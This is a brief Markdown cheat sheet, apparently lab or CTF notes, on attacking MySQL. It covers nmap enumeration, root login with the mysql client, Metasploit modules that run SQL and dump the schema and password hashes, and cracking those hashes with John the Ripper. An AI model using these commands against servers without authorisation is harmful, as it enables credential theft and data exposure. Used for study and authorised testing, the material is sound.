# MySQL

## Enumeration with MySQL


```
nmap --script mysql-enum <ip_addr>
```

```
mysql -h 10.10.248.226 -u root -p [ --ssl-mode=DISABLED | --skip-ssl ]
```

## SQL with Metasploit

```
msf6> use auxiliary/admin/mysql/mysql_sql
msf6> set RHOSTS <ip_addr>
msf6> set USERNAME <username>
msf6> set PASSWORD <password>
msf6> set SQL "SELECT * FROM ..."
```
## Dumping the MySQL Schema
```
msf6> use auxiliary/scanner/mysql/mysql_schemadump
[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
msf6> set RHOSTS <ip_addr>
msf6> set USERNAME <username>
msf6> set PASSWORD <password>
```
## Dumping Password Hashes
```
msf6> use auxiliary/scanner/mysql/mysql_hashdump
msf6> set RHOSTS <ip_addr>
msf6> set USERNAME <username>
msf6> set PASSWORD <password>
```
## Cracking the MySQL hash with John the Ripper
```
echo 'username:<hash>' > hash.txt
john hash.txt
```